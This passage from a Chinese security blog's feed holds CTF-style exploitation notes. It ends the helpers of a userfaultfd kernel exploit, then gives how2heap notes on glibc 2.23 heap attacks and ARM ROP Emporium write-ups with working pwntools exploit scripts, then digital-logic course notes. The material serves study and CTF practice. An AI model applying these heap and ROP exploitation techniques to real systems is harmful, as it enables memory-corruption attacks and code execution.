%s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6f49503c2c4f4ec5a635efb4038e09da.png"></p><p>成功getshell（有较高的失败率，需要多次尝试）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(1)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>刚刚接触pwn的时候就听说过how2heap的大名，奈何那时懒得搭环境无法真实测试。现在环境已经基本完成搭建，于是对how2heap中的内容进行深入学习并记录笔记，温故而知新。本文是基于对how2heap教学项目中源码的分析与理解而完成的学习笔记。</p><p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p><p>按照顺序，本文分析glibc 2_23文件夹中的第1~6个源码。<br><img src="https://img-blog.csdnimg.cn/259410f4b62e4827805f09a9decddb3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><h1 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h1><p>本程序演示fastbin的double_free漏洞。只需要在两次free中间再进行其他free操作，就可以在fastbin链表中存放两个相同的chunk。这个不难理解。</p><h1 id="2-fastbin-dup-consolidate"><a href="#2-fastbin-dup-consolidate" class="headerlink" title="2. fastbin_dup_consolidate"></a>2. fastbin_dup_consolidate</h1><p>本程序演示另一种double_free漏洞。在glibc 2.23中，如果fastbin中有chunk存在，那么之后申请一块大于fastbin范围的chunk，会将fastbin中的chunk转移到small bins中。原因如下：</p><p><em>首先fastbin中的chunk会通过malloc_consolidate函数转移到unsorted bins中，之后malloc函数在unsorted bins中查找符合大小的chunk。这时就发现了刚刚被转移过来的小chunk。发现大小不够之后，这些chunk又会被转移到small bins中。（malloc在遍历unsorted bin时会将大小不符合的chunk转移到small bins&#x2F;large bins中）</em></p><p>此时，fastbin为空，可以将原先在fastbin中的chunk再次free，形成double_free漏洞。</p><p><font color=red>注意：在Glibc 2.23中，malloc只会检查fastbin中是否进行了连续的两次free，而不会将fastbin和其他bins中的chunk整合进行检查。</font></p><p>此时，在fastbins和small bins中就存在两个相同的chunk。</p><h1 id="3-fastbin-dup-into-stack"><a href="#3-fastbin-dup-into-stack" class="headerlink" title="3. fastbin_dup_into_stack"></a>3. fastbin_dup_into_stack</h1><p>本程序演示double_free漏洞的一种应用，即利用fastbin_dup中的double_free漏洞将堆挟持到栈区，在栈区创建chunk。<br>首先进行double_free。此时fastbin中的结构为：</p><blockquote><p>fastbin → a → b → a</p></blockquote><p>此时将a分配出来，即可对a的fd指针进行任意写。</p><p><font color=red>注意：fastbin是一个链栈结构，遵循后进先出的规则。因此将a分配出来后fastbin的结构为：</font></p><blockquote><p>fastbin → b → a</p></blockquote><p>现在，将a中的fd指针更改为栈区某处（这里实际上可以改为任何可写的区域，如bss段等）。将b分配出去，再次分配a后，fastbin中就会有我们自定义的那个地址。</p><blockquote><p>fastbin → &lt;any address we want&gt; → &lt;other things&gt;</p></blockquote><p>再分配相同大小的chunk，就可以将chunk分配到任何可写的地方。</p><h1 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h1><p>本程序演示house of einherjar漏洞。这是一种null off by one漏洞，即仅溢出一个’\x00’字节即可实现任意地址写。原理如下：</p><p><font color=red>首先，需要明确的是，在glibc 2.23 64bit中，如果malloc的大小为0x8 + n*0x10，那么该chunk能够控制下一个chunk的previous size值。因为chunk在64bit中按照0x10对齐（32bit中以0x8对齐），所有chunk的起始地址最低4bit均为0。因此对于分配0x8 + n*0x10的情况，glibc做出的处理是：将后一个chunk的previous size域作为前一个chunk的可用空间。正常情况下，当前一个chunk正在使用时，后一个chunk的previous size不起作用。</font></p><p>在上述的前提条件下，可以任意指定previous size的值，并通过溢出一个’\x00’字节对后面一个chunk的size进行部分修改。</p><ul><li>如果后面一个chunk的size域最低一字节原来为0x01（1表示prev_in_use标志位，即前面一个chunk正在使用中），溢出后变为0x00。假设后一个chunk的地址为x，需要写的地址为y。那么应将后一个chunk的prev_size改为x-y。这样在free后面一个chunk时，malloc_consolidate函数会进行chunk的合并，将chunk头的地址当做y。</li></ul><p><font color=red>注意：这里不会进行整型溢出的检查，因此x&lt;y也是可行的，此时x-y是一个很大的数。</font></p><ul><li>如果后面一个chunk的size域最低一字节原来不是0x01而是0x?1，那么溢出一个空字符后，chunk的size会被改变。如果此时不加任何其他处理，在chunk与top chunk合并时会出错。原理：</li></ul><p><em>_int_free函数中判断后一个chunk是通过size偏移确定的，如果size被改变且没有在后面伪造chunk，在_int_free函数中有一项检查是后一个chunk的prev_in_use是否为1。很显然正常情况下这里都是1，因为没有free之前前一个chunk正在使用，因此如果此时后一个chunk的prev_in_use位为0说明堆结构被篡改。</em></p><h2 id="重要：-int-free中的检查项目（部分）"><a href="#重要：-int-free中的检查项目（部分）" class="headerlink" title="重要：_int_free中的检查项目（部分）"></a>重要：_int_free中的检查项目（部分）</h2><ol><li>检查相邻chunk是否相等，是则为double free</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>检查该chunk是否为top chunk，top chunk不可被free</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">   &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>检查该chunk是否超过了arena的范围</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  \&gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">   &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>检查紧跟该chunk后面（高地址处）的prev_in_use位是否为1</strong></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">   &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>检查紧跟该chunk后面的size是否合理（不能过小或过大）</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><font color=blue>笔记：free调用时会调用malloc_consolidate函数整理fastbins。对于fastbins中的chunk先向低地址合并再向高地址合并。这一步操作在最后完成</font></p><ul><li>因此后面一个chunk的size域最低一字节原来不是0x01而是0x?1时，需要在对应的位置伪造一个chunk，将损失的size大小补齐，来绕过检查。后面的效果与第一种情况相同。</li></ul><h1 id="5-house-of-force"><a href="#5-house-of-force" class="headerlink" title="5. house_of_force"></a>5. house_of_force</h1><p>本程序演示house_of_force漏洞。这个漏洞的思路比较简单，利用了top chunk。</p><p>在glibc 2.23中，malloc不会对top chunk的size进行检查，因此如果能够将top chunk的size修改为很大，就可以malloc任意大小的chunk，从而在任意地址写。</p><p><font color=purple>注意：malloc不检查整型溢出。如果需要写的地址在top chunk的低地址处，也可以通过整型溢出到达。</font></p><p>假设top chunk头的地址为x，要写的地址为y。那么首先malloc大小为x-y大小的堆块，然后再malloc一下即可对该地址写。注意前面的prev_size和size，必要时需要分配x-y-0x10（32bit为x-y-0x8）大小堆块以实现对目标地址的完全控制。</p><h1 id="6-house-of-lore"><a href="#6-house-of-lore" class="headerlink" title="6. house_of_lore"></a>6. house_of_lore</h1><p>本程序演示house_of_lore漏洞，这是一种利用small_bins的攻击方式。</p><p>small bins&#x2F;large bins&#x2F;unsorted bins的双向链表结构如下图所示<br><img src="https://img-blog.csdnimg.cn/e11840261fe44692a5a97963baa426aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>同unsorted bin类似，small bin也类似于链栈结构，但是双向链表。将small bins中位于链尾的chunk的bk指针修改为想要写的地址，在small bin中的chunk被分配完之后，再次分配就能在该地址创建chunk。</p><p>但是在目标地址处还需要进行一些预处理工作。由于glibc的检查机制，导致直接挟持堆不可行。</p><p>下面是_int_malloc函数中查找small bins片段的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">         malloc_consolidate (av);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">         &#123;</span><br><span class="line">           errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">           <span class="keyword">goto</span> errout;</span><br><span class="line">         &#125;</span><br><span class="line">         set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">         bin-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">           victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>其中有一个明显的检查是<code>__glibc_unlikely (bck-&gt;fd != victim)</code>，它检查要分配的chunk的bk指向的chunk中的fd指针是否是这个chunk。由于我们要分配的是一个假的chunk，因此需要提前设置好这个假chunk的bk指针，以及bk指针指向的另外一处假chunk中fd指针的值，保证二者正确。为了保证结果正确，如果在假chunk之前分配的chunk地址已知，可以将这个地址写入假chunk的fd指针中以使得双向链表完整。当然就上述代码来看这里不设置应该也是可以的。</p><p><font color=red>注意：这里的检查并未涉及prev_size和size，因此这二者的值对于假chunk的分配没有影响。原演示文件中将这两个值均设为0。</font></p><p>因此总结一下，如果需要写入的地址为x，那么需要将small bins中最后一个chunk的bk指针改为x-0x20（如果写入垃圾数据无妨，可以将这个地址再适当下压一些，如x-0x30，这就需要写入0x10字节的垃圾数据），并且需要在x-0x8处（对应bk）写入另一个地址y，在y+0x10处（对应fd）需要写入x-0x20。故实现该漏洞不仅需要能够在可写地址的低地址方向某处一个8字节区域可写，并且需要另一处8字节区域可写。（需要的两处可写的地方即为下表中标红的地方）</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">x-0x20</td><td align="center">prev_size</td><td align="center">size</td></tr><tr><td align="center">x-0x10</td><td align="center">DEADBEEF</td><td align="center"><font color=red>addr_y</font></td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">y</td><td align="center">prev_size</td><td align="center">size</td></tr><tr><td align="center">y+0x10</td><td align="center"><font color=red>addr_x-0x20</font></td><td align="center">DEADBEEF</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM pwn 入门 (3)</title>
      <link href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/"/>
      <url>/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/</url>
      
        <content type="html"><![CDATA[<p><font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个<a href="https://ropemporium.com/">网站</a>有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font></p><h1 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1. ret2win"></a><font face=汉仪唐美人>1. ret2win</font></h1><p><font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用<code>qemu-arm xxx</code>有可能会报错：<code>/lib/ld-linux.so.3: No such file or directory</code>。解决方法：安装arm交叉编译包<code>apt install gcc-arm-linux-gnueabi</code>，找到交叉编译包的lib地址（一般都是<code>/usr/arm-linux-gnueabi</code>），在命令后添加<code>-L /usr/arm-linux-gnueabi</code>即可。</font></p><p><img src="https://img-blog.csdnimg.cn/72f8330410f2409099e3a2911a620c49.png"><br><font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font></p><p><font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方<code>BL</code>指令调用<code>read</code>函数前，首先将第3个参数<code>nbytes</code>赋值给<code>R2</code>寄存器。在<code>pwnme</code>函数开头有一个<code>PUSH</code>指令，这里的<code>R11</code>可以看做是<code>rbp</code>，<code>LR</code>是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存<code>R11</code>的值作为栈帧的标记，<code>SP</code>下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font></p><p><font face=汉仪唐美人>下面看到<code>read</code>函数的调用部分。第二个参数<code>R1</code>的值为<code>R11-0x24</code>，由于<code>R11</code>在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font></p><p><font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复<code>SP</code>为<code>R11-4</code>，然后<code>R11</code>出栈，<code>PC</code>出栈。在正常情况下，这里的<code>R11</code>出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，<code>R11</code>就无效了。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(<span class="number">0x105ec</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-split"><a href="#2-split" class="headerlink" title="2. split"></a><font face=汉仪唐美人>2. split</font></h1><p><img src="https://img-blog.csdnimg.cn/4eb497d770a04a65bc7378c24aaaa801.png"><br><img src="https://img-blog.csdnimg.cn/1c558b27837b49ca94e561b7cb4ff4d5.png"></p><p><font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font></p><p><font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font></p><p><img src="https://img-blog.csdnimg.cn/30cf8aeff38a4fe995135615b75f0511.png"></p><p><font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用<code>pop</code>指令的gadget中没有能够<code>pop r0</code>的，我们只能扩大范围进行查找：</font></p><p><img src="https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png" alt="在这里插入图片描述"></p><p><font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的<code>pop &#123;r3, pc&#125;</code>连接起来，首先修改<code>r3</code>的值，再修改<code>r0</code>的值即可。于是我们的exp呼之欲出：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./split_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">popr3pc = <span class="number">0x103a4</span></span><br><span class="line">movr0r3_popfppc = <span class="number">0x10558</span></span><br><span class="line">shellstr = <span class="number">0x2103c</span></span><br><span class="line">callsystem = <span class="number">0x105e0</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(popr3pc) + p32(shellstr) + p32(movr0r3_popfppc) + p32(<span class="number">0</span>) + p32(callsystem))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><font face=汉仪唐美人>PS：本来想发三道题的，但是这周末比赛打的太累了，第三题就留到后面一篇文章发了，还请谅解。</font></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 4——组合逻辑电路</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-4%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-4%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="4-0-概念"><a href="#4-0-概念" class="headerlink" title="4.0 概念"></a>4.0 概念</h1><ol><li>组合逻辑电路：逻辑电路在任何时刻产生的稳定输出信号仅仅取决于该时刻的输入信号，而与输入信号作用前的电路状态无关（即不含触发器），则称为组合逻辑电路</li><li>结构特点：电路由逻辑门构成，不含记忆元件；输入单向传输，不含反馈回路</li><li>电路类型：根据输出端为1个还是多个分为单输出组合逻辑电路和多输出组合逻辑电路。</li></ol><h1 id="4-1-组合逻辑电路分析"><a href="#4-1-组合逻辑电路分析" class="headerlink" title="4.1 组合逻辑电路分析"></a>4.1 组合逻辑电路分析</h1><p>对一个给定的逻辑电路，找出其输出与输入之间的逻辑关系。</p><p>分析的一般步骤：</p><ul><li>逻辑电路图（题目中一般给出）</li><li>写出逻辑表达式（分析逻辑电路图，具体分析过程无需详细写出）</li><li>若电路功能直观简单，则跳过2步，若表达式较为复杂，则需要画出卡诺图化简表达式，否则跳过该步</li><li>画出输出端的真值表</li><li>分析逻辑功能</li><li>改进电路使电路更简单</li></ul><h1 id="4-2-组合逻辑电路设计"><a href="#4-2-组合逻辑电路设计" class="headerlink" title="4.2 组合逻辑电路设计"></a>4.2 